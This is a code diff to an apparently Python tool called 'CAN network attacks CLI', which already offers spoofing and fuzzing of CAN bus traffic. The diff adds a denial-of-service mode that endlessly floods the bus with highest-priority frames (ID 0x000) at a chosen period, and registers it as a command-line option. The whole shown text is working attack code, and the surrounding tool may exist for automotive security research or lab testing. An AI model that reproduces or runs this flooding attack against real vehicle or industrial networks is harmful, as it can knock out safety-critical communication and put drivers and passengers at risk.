@@ -5,6 +5,14 @@ import random
 
 from reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER
 
+def denial_of_service_func(bus, period: float):
+    while True:
+        msg = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
+        bus.send(msg)
+        print(f"Sent message: {msg}")
+        time.sleep(period)
+
+
 def fuzzy_attack_func(bus):
     known_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
     n_of_attacks = len(known_attacks)
@@ -34,7 +42,7 @@ def spoofing_attacks_func(bus, feature: str, period: float):
 def main():
     print("CAN network attacks CLI")
     spoofing_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
-    available_features = [*spoofing_attacks, "fuzzy"]
+    available_features = [*spoofing_attacks, "fuzzy", "denial_of_service"]
 
     parser = argparse.ArgumentParser(description="Perform CAN network attacks.")
     parser.add_argument("--feature", choices=available_features, help="Feature to attack")
@@ -52,6 +60,9 @@ def main():
         if args.feature == "fuzzy":
             print(f"Attacking feature: {args.feature}")
             fuzzy_attack_func(bus)
+        elif args.feature == "denial_of_service":
+            print(f"Attacking feature: {args.feature} with period {args.period} seconds")
+            denial_of_service_func(bus, args.period)
         else:
             print(f"Attacking feature: {args.feature} with period {args.period} seconds")
             spoofing_attacks_func(bus, args.feature, args.period)
